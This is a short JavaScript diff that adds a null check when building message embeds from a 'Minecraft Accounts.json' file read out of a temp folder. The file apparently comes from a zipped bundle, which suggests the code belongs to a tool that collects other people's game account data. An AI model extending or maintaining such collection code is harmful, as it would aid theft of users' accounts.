@@ -201,6 +201,8 @@ const json = async (zipFile) => {
     const accounts = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Minecraft Accounts.json'), 'utf8'));
 
     accounts.forEach(account => {
+      if (!account.minecraftProfile) return;
+
       embeds.push({
         author: {
           name: account.minecraftProfile.name,
